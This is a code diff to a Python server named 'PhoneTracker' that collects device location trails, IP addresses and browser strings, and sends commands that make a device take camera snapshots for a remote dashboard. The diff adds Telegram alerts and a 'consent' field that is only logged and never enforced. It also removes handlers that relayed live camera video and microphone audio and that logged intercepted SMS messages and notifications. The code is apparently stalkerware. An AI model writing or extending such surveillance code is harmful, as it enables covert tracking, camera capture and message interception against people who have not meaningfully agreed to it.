@@ -5,6 +5,9 @@ import time
 import os
 import base64
 import logging
+import json
+import urllib.parse
+import urllib.request
 from datetime import datetime
 from threading import Lock
 
@@ -23,6 +26,12 @@ def parse_cors_origins(raw):
     if not raw or raw.strip() == "*":
         return "*"
     return [origin.strip() for origin in raw.split(",") if origin.strip()]
+
+
+def parse_env_bool(value, default=False):
+    if value is None:
+        return default
+    return str(value).strip().lower() in {"1", "true", "yes", "on"}
 
 # Professional Buffer: Optimized for high-speed binary data (Live Video/Audio)
 # max_http_buffer_size set to 20MB to handle high-res snapshots without crashing
@@ -53,19 +62,20 @@ dashboard_sids = set()
 DASHBOARD_BROADCAST_INTERVAL = 1.0
 TRAIL_LOG_INTERVAL_SECONDS = 15
 DASHBOARD_ROOM = "dashboard_viewers"
-STREAM_RELAY_INTERVAL_SECONDS = 0.20
-MAX_FRAME_AGE_SECONDS = 1.5
 OFFLINE_DEVICE_TIMEOUT_SECONDS = int(os.environ.get("OFFLINE_DEVICE_TIMEOUT_SECONDS", "60"))
 DEVICE_SWEEP_INTERVAL_SECONDS = int(os.environ.get("DEVICE_SWEEP_INTERVAL_SECONDS", "15"))
 MAX_DEVICE_ID_LENGTH = 128
 MAX_TEXT_FIELD_LENGTH = 256
 MAX_MESSAGE_LENGTH = 2048
 MAX_SNAPSHOT_DATA_URL_LENGTH = 25_000_000
+TELEGRAM_ALERTS_ENABLED = parse_env_bool(os.environ.get("TELEGRAM_ALERTS_ENABLED", "0"))
+TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
+TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
+telegram_last_error = ""
 
 last_dashboard_emit = 0.0
 dashboard_emit_scheduled = False
 APP_START_TS = time.time()
-last_stream_emit_by_device = {}
 sweeper_started = False
 
 metrics = {
@@ -75,9 +85,9 @@ metrics = {
     "telemetry_events": 0,
     "snapshot_requests": 0,
     "snapshot_received": 0,
-    "stream_frames": 0,
-    "audio_chunks": 0,
-    "notifications": 0,
+    "system_alerts": 0,
+    "telegram_sent": 0,
+    "telegram_failed": 0,
     "pings_sent": 0,
     "pongs_received": 0,
 }
@@ -166,6 +176,64 @@ def get_device_id_by_sid(sid):
     return None
 
 
+def get_request_ip():
+    forwarded = request.headers.get("X-Forwarded-For", "")
+    if forwarded:
+        return safe_text(forwarded.split(",")[0], MAX_TEXT_FIELD_LENGTH)
+    return safe_text(request.headers.get("X-Real-IP") or request.remote_addr, MAX_TEXT_FIELD_LENGTH)
+
+
+def send_system_alert(message, level="info", device_id="system"):
+    safe_message = safe_text(message, MAX_MESSAGE_LENGTH)
+    payload = {
+        "device_id": safe_text(device_id, MAX_DEVICE_ID_LENGTH) or "system",
+        "level": safe_text(level, 32) or "info",
+        "message": safe_message,
+        "timestamp": int(time.time()),
+    }
+    inc_metric("system_alerts")
+    socketio.emit("system_alert", payload, room=DASHBOARD_ROOM)
+
+
+def send_telegram_alert(text):
+    global telegram_last_error
+    if not TELEGRAM_ALERTS_ENABLED:
+        telegram_last_error = "telegram alerts disabled"
+        return False
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        telegram_last_error = "missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID"
+        inc_metric("telegram_failed")
+        app.logger.warning("Telegram alert skipped: %s", telegram_last_error)
+        return False
+
+    try:
+        endpoint = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        body = urllib.parse.urlencode({"chat_id": TELEGRAM_CHAT_ID, "text": text}).encode("utf-8")
+        req = urllib.request.Request(endpoint, data=body, method="POST")
+        req.add_header("Content-Type", "application/x-www-form-urlencoded")
+        with urllib.request.urlopen(req, timeout=8) as resp:
+            raw_body = resp.read().decode("utf-8")
+            if resp.status != 200:
+                telegram_last_error = f"http {resp.status}: {raw_body[:180]}"
+                inc_metric("telegram_failed")
+                app.logger.warning("Telegram API non-200: %s", telegram_last_error)
+                return False
+            data = json.loads(raw_body)
+            if data.get("ok"):
+                telegram_last_error = ""
+                inc_metric("telegram_sent")
+                return True
+            description = str(data.get("description", "unknown error"))
+            telegram_last_error = f"telegram api error: {description[:180]}"
+            app.logger.warning("Telegram API error: %s", telegram_last_error)
+    except Exception:
+        telegram_last_error = "exception while sending telegram alert"
+        app.logger.exception("Telegram send failed")
+
+    inc_metric("telegram_failed")
+    return False
+
+
 def _delayed_dashboard_emit(delay):
     global last_dashboard_emit, dashboard_emit_scheduled
     time.sleep(max(delay, 0))
@@ -218,6 +286,18 @@ def healthz():
     })
 
 
+@app.route("/test-telegram")
+def test_telegram():
+    ok = send_telegram_alert("Test alert from your PhoneTracker server")
+    return jsonify({
+        "sent": ok,
+        "enabled": TELEGRAM_ALERTS_ENABLED,
+        "configured": bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID),
+        "chat_id_suffix": TELEGRAM_CHAT_ID[-4:] if TELEGRAM_CHAT_ID else "",
+        "last_error": telegram_last_error,
+    })
+
+
 @app.route("/metrics")
 def get_metrics():
     now = time.time()
@@ -233,6 +313,12 @@ def get_metrics():
                 "offline": max(total_devices - online_devices, 0),
                 "total": total_devices,
             },
+            "telegram": {
+                "enabled": TELEGRAM_ALERTS_ENABLED,
+                "configured": bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID),
+                "chat_id_suffix": TELEGRAM_CHAT_ID[-4:] if TELEGRAM_CHAT_ID else "",
+                "last_error": telegram_last_error,
+            },
             "sockets": {
                 "dashboard_viewers": len(dashboard_sids)
             },
@@ -240,9 +326,9 @@ def get_metrics():
             "rates_per_second": {
                 "dashboard_emits": round(metrics.get("dashboard_emits", 0) / uptime_seconds, 3),
                 "telemetry_events": round(metrics.get("telemetry_events", 0) / uptime_seconds, 3),
-                "stream_frames": round(metrics.get("stream_frames", 0) / uptime_seconds, 3),
-                "audio_chunks": round(metrics.get("audio_chunks", 0) / uptime_seconds, 3),
-                "notifications": round(metrics.get("notifications", 0) / uptime_seconds, 3),
+                "system_alerts": round(metrics.get("system_alerts", 0) / uptime_seconds, 3),
+                "telegram_sent": round(metrics.get("telegram_sent", 0) / uptime_seconds, 3),
+                "telegram_failed": round(metrics.get("telegram_failed", 0) / uptime_seconds, 3),
             }
         }
 
@@ -264,6 +350,8 @@ def init_db():
         platform TEXT,
         model TEXT,
         network TEXT,
+        ip_address TEXT,
+        browser TEXT,
         lat REAL,
         lon REAL,
         last_seen INTEGER
@@ -296,6 +384,12 @@ def init_db():
     c.execute("CREATE INDEX IF NOT EXISTS idx_trails_device_time ON trails(device_id, timestamp)")
     c.execute("CREATE INDEX IF NOT EXISTS idx_logs_device_time ON logs(device_id, timestamp)")
 
+    existing_columns = {row[1] for row in c.execute("PRAGMA table_info(devices)").fetchall()}
+    if "ip_address" not in existing_columns:
+        c.execute("ALTER TABLE devices ADD COLUMN ip_address TEXT")
+    if "browser" not in existing_columns:
+        c.execute("ALTER TABLE devices ADD COLUMN browser TEXT")
+
     conn.commit()
     conn.close()
 
@@ -307,8 +401,8 @@ def save_device(data, log_trail=True):
     # Save/Update main device info
     c.execute("""
     INSERT OR REPLACE INTO devices
-    (device_id, battery, charging, platform, model, network, lat, lon, last_seen)
-    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+    (device_id, battery, charging, platform, model, network, ip_address, browser, lat, lon, last_seen)
+    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
     """, (
         data["device_id"],
         data.get("battery"),
@@ -316,6 +410,8 @@ def save_device(data, log_trail=True):
         data.get("platform"),
         data.get("model", "Unknown"),
         data.get("network", "Unknown"),
+        data.get("ip_address", ""),
+        data.get("browser", ""),
         data.get("lat"),
         data.get("lon"),
         data["last_seen"]
@@ -346,6 +442,8 @@ def load_devices():
                 "platform": r["platform"],
                 "model": r["model"],
                 "network": r["network"],
+                "ip_address": r["ip_address"] if "ip_address" in r.keys() else "",
+                "browser": r["browser"] if "browser" in r.keys() else "",
                 "lat": r["lat"],
                 "lon": r["lon"],
                 "last_seen": r["last_seen"],
@@ -382,12 +480,27 @@ def register_device(data):
     device_id = safe_text(data.get("device_id"), MAX_DEVICE_ID_LENGTH)
     if not device_id:
         return
+    ip_address = safe_text(data.get("ip_address") or get_request_ip(), MAX_TEXT_FIELD_LENGTH)
+    browser = safe_text(data.get("browser") or request.headers.get("User-Agent", ""), MAX_TEXT_FIELD_LENGTH)
+    consent = bool(data.get("consent_granted", False))
 
     print(f"[*] Device Online: {device_id}")
     devices.setdefault(device_id, {})
     devices[device_id]["sid"] = request.sid
     devices[device_id]["status"] = "online"
     devices[device_id]["last_seen"] = int(time.time())
+    devices[device_id]["ip_address"] = ip_address
+    devices[device_id]["browser"] = browser
+    devices[device_id]["consent_granted"] = consent
+
+    send_system_alert(
+        f"Device online ({device_id[:12]}), consent={'yes' if consent else 'no'}",
+        level="info",
+        device_id=device_id,
+    )
+    send_telegram_alert(
+        f"Device online: {device_id}\nConsent: {'yes' if consent else 'no'}\nIP: {ip_address or 'unknown'}"
+    )
 
     emit_dashboard_update(force=True)
 
@@ -402,6 +515,8 @@ def handle_disconnect():
         if devices[d].get("sid") == sid:
             devices[d]["status"] = "offline"
             print(f"[!] Device Offline: {d}")
+            send_system_alert(f"Device offline ({d[:12]})", level="warning", device_id=d)
+            send_telegram_alert(f"Device offline: {d}")
             break
     emit_dashboard_update(force=True)
 
@@ -428,6 +543,9 @@ def telemetry(data):
         "platform": safe_text(data.get("platform"), MAX_TEXT_FIELD_LENGTH),
         "model": safe_text(data.get("model"), MAX_TEXT_FIELD_LENGTH),
         "network": safe_text(data.get("network"), MAX_TEXT_FIELD_LENGTH),
+        "ip_address": safe_text(data.get("ip_address") or get_request_ip(), MAX_TEXT_FIELD_LENGTH),
+        "browser": safe_text(data.get("browser") or request.headers.get("User-Agent", ""), MAX_TEXT_FIELD_LENGTH),
+        "consent_granted": bool(data.get("consent_granted", device.get("consent_granted", False))),
         "lat": lat,
         "lon": lon,
         "last_seen": int(time.time()),
@@ -464,14 +582,13 @@ def request_snapshot(device_id):
         print(f"[>] Triggering Snapshot: {device_id}")
         socketio.emit("take_snapshot", room=device.get("sid"))
     else:
-        socketio.emit(
-            "new_notification_alert",
-            {
-                "device_id": device_id or "unknown",
-                "title": "Snapshot failed",
-                "body": "Device is offline or has no active socket session."
-            },
-            room=DASHBOARD_ROOM,
+        send_system_alert(
+            "Snapshot failed: device is offline or has no active socket session.",
+            level="error",
+            device_id=device_id or "unknown",
+        )
+        send_telegram_alert(
+            f"Snapshot failed for {device_id or 'unknown'}: device offline or no active session"
         )
 
 # -----------------------
@@ -533,79 +650,10 @@ def snapshot_data(data):
         print(f"[+] Photo Saved: {filename}")
         # Send back to dashboard for viewing
         socketio.emit("view_snapshot", {"device_id": device_id, "image": image_data}, room=DASHBOARD_ROOM)
+        send_system_alert("Snapshot received", level="info", device_id=device_id)
+        send_telegram_alert(f"Snapshot received from {device_id}")
     except Exception as e:
         print(f"Snapshot Processing Error: {e}")
-
-@socketio.on("stream_frame")
-def handle_stream(data):
-    # Relay live camera frame to dashboard viewers only
-    if not isinstance(data, dict):
-        return
-    data.setdefault("device_id", get_device_id_by_sid(request.sid))
-    if not data.get("device_id") or not data.get("frame"):
-        return
-
-    frame_timestamp = data.get("ts")
-    if isinstance(frame_timestamp, (int, float)):
-        frame_age_seconds = (time.time() * 1000 - frame_timestamp) / 1000
-        if frame_age_seconds > MAX_FRAME_AGE_SECONDS:
-            return
-
-    device_id = data.get("device_id")
-    now = time.time()
-    last_emit = last_stream_emit_by_device.get(device_id, 0.0)
-    if (now - last_emit) < STREAM_RELAY_INTERVAL_SECONDS:
-        return
-
-    last_stream_emit_by_device[device_id] = now
-    inc_metric("stream_frames")
-    socketio.emit("render_frame", data, room=DASHBOARD_ROOM)
-
-# -----------------------
-# 🔊 Microphone Audio Handler
-# -----------------------
-@socketio.on("audio_chunk")
-def handle_audio(chunk):
-    # Relay binary audio chunks to dashboard viewers only
-    if not isinstance(chunk, dict):
-        return
-    chunk.setdefault("device_id", get_device_id_by_sid(request.sid))
-    if not chunk.get("audio"):
-        return
-    inc_metric("audio_chunks")
-    socketio.emit("play_audio", chunk, room=DASHBOARD_ROOM)
-
-# -----------------------
-# 📱 SMS & Notification Extractor
-# -----------------------
-@socketio.on("incoming_notification")
-def handle_notification(data):
-    device_id = safe_text(data.get("device_id"), MAX_DEVICE_ID_LENGTH)
-    if not device_id:
-        return
-
-    title = safe_text(data.get("title"), MAX_TEXT_FIELD_LENGTH)
-    body = safe_text(data.get("body"), MAX_MESSAGE_LENGTH)
-    inc_metric("notifications")
-    
-    # Save to Database Logs
-    conn = get_db_connection()
-    c = conn.cursor()
-    c.execute("""
-    INSERT INTO logs (device_id, type, sender, message, timestamp)
-    VALUES (?, ?, ?, ?, ?)
-    """, (device_id, "SMS/Notification", title, body, int(time.time())))
-    conn.commit()
-    conn.close()
-
-    print(f"[!] New SMS/Notification from {device_id}")
-    # Instant push alert for the dashboard
-    socketio.emit("new_notification_alert", {
-        "device_id": device_id,
-        "title": title,
-        "body": body,
-        "timestamp": int(time.time())
-    }, room=DASHBOARD_ROOM)
 
 # -----------------------
 # Server Execution
